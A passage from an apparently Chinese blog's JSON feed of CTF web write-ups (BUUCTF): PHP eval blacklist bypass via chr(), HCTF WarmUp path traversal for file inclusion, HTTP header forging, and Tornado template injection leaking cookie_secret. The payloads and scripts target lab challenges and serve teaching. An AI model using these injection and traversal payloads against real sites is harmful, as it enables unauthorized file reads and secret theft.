class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\['</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\]'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\$'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\^'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you want to do?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'echo '</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到存在很多waf，eval执行函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\ncalc<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span> num<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//扫描上级的文件</span>\n发现f1agg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\ncalc<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span> num<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">102</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">49</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">97</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">103</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">103</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n得到flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/hctf-2018-warmup/",
            "url": "https://0xdadream.github.io/2021/03/01/hctf-2018-warmup/",
            "title": "HCTF_2018 WarmUp",
            "date_published": "2021-03-01T01:11:00.000Z",
            "content_html": "<h2 id=\"HCTF-2018-WarmUp\"><a href=\"#HCTF-2018-WarmUp\" class=\"headerlink\" title=\"[HCTF 2018]WarmUp\"></a>[HCTF 2018]WarmUp</h2><p>进去只有一张图片，查看源代码  发现<!--source.php--></p>\n<p>进入source.php得到如下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>  \n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>代码审计</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>传入一个’file’，满足不为空，是字符串，满足checkFile函数，就能被包含</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token comment\">//不为空，是字符串的通过</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token comment\">//检查是否在白名单</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//找到第一个'?</span><span class=\"token string single-quoted-string\">'的索引\n            );//截取'</span><span class=\"token operator\">?</span><span class=\"token string single-quoted-string\">'前面的字符\n            if (in_array($_page, $whitelist)) {//检查截取后是否在白名单\n                return true;\n            }\n\n            $_page = urldecode($page);//url解码\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '</span><span class=\"token operator\">?</span><span class=\"token string single-quoted-string\">', '</span><span class=\"token operator\">?</span><span class=\"token string single-quoted-string\">')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can'</span>t see it\"<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析后得到函数功能  只需要满足一个ture就能进入包含文件</p>\n<p>进入hint.php  得到提示flag not here, and flag in ffffllllaaaagggg</p>\n<p>猜测是目录遍历</p>\n<p>这里构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span>source<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>hint<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>ffffllllaaaagggg\n或者\n<span class=\"token operator\">/</span>source<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>hint<span class=\"token operator\">.</span>php<span class=\"token operator\">%</span><span class=\"token number\">253</span>F<span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>ffffllllaaaagggg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>成功了</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-http/",
            "url": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-http/",
            "title": "极客大挑战_2019 Http",
            "date_published": "2021-03-01T00:57:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h2><p>检查源码，发现<code>Secret.php</code></p>\n<p>进入<code>Secret.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">It doesn<span class=\"token string single-quoted-string\">'t come from '</span>https<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.Sycsecret.com'提示</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>burp抓包修改Referer</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Referer<span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.Sycsecret.com</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">提示Please <span class=\"token keyword\">use</span> <span class=\"token string double-quoted-string\">\"Syclover\"</span> brows<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改UA</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">User<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Syclover<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">提示No<span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span> you can only read this locally<span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改XFF</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">X</span><span class=\"token operator\">-</span>Forwarded<span class=\"token operator\">-</span><span class=\"token keyword\">For</span><span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/",
            "url": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/",
            "title": "极客大挑战_2019 Havefun",
            "date_published": "2021-03-01T00:47:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-Havefun\"><a href=\"#极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"[极客大挑战 2019]Havefun\"></a>[极客大挑战 2019]Havefun</h2><p>审查源代码得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$cat</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cat'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$cat</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cat</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'dog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Syc{cat_cat_cat_cat}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>传入参数=dog</p>\n<p>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>cat<span class=\"token operator\">=</span>dog<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/hu-wang-bei-2018-easy-tornado/",
            "url": "https://0xdadream.github.io/2021/03/01/hu-wang-bei-2018-easy-tornado/",
            "title": "护网杯_2018 easy_tornado",
            "date_published": "2021-03-01T00:27:00.000Z",
            "content_html": "<h2 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h2><p>进入三个文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span>flag<span class=\"token operator\">.</span>txt\nflag in <span class=\"token operator\">/</span>fllllllllllllag\nfile<span class=\"token operator\">?</span>filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>flag<span class=\"token operator\">.</span>txt<span class=\"token operator\">&amp;</span>filehash<span class=\"token operator\">=</span><span class=\"token number\">9053</span>c61f6b76e014b1e003957ee5b546\n\n<span class=\"token operator\">/</span>welcome<span class=\"token operator\">.</span>txt\nrender\nfile<span class=\"token operator\">?</span>filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>welcome<span class=\"token operator\">.</span>txt<span class=\"token operator\">&amp;</span>filehash<span class=\"token operator\">=</span><span class=\"token number\">7</span>d2c2069a844d7a93c2d6ee197618bd6\n\n<span class=\"token operator\">/</span>hints<span class=\"token operator\">.</span>txt\n<span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>cookie_secret<span class=\"token operator\">+</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nfile<span class=\"token operator\">?</span>filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>hints<span class=\"token operator\">.</span>txt<span class=\"token operator\">&amp;</span>filehash<span class=\"token operator\">=</span>b01fb2c2497da3d0979b7965d57a95dc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>猜测payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file<span class=\"token operator\">?</span>filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>fllllllllllllag<span class=\"token operator\">&amp;</span>filehash<span class=\"token operator\">=</span><span class=\"token string backtick-quoted-string\">`md5(cookie_secret+md5(/fllllllllllllag))`</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>现在主要就是找<code>cookie_secret</code></p>\n<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用，从<code>render</code>可以猜测是模板注入</p>\n<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\nerror<span class=\"token operator\">?</span>msg<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>handler<span class=\"token operator\">.</span>settings<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">{</span><span class=\"token string single-quoted-string\">'autoreload'</span><span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'compiled_template_cache'</span><span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cookie_secret'</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'591f8ab1-795d-4d61-9975-6da84c69a663'</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>用脚本跑得到filehash</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> hashlib\n<span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nfilename<span class=\"token operator\">=</span><span class=\"token string\">'/fllllllllllllag'</span>\ncookie_secret<span class=\"token operator\">=</span><span class=\"token string\">\"591f8ab1-795d-4d61-9975-6da84c69a663\"</span>\n<span class=\"token builtin\">hash</span><span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ns1<span class=\"token operator\">=</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">hash</span> <span 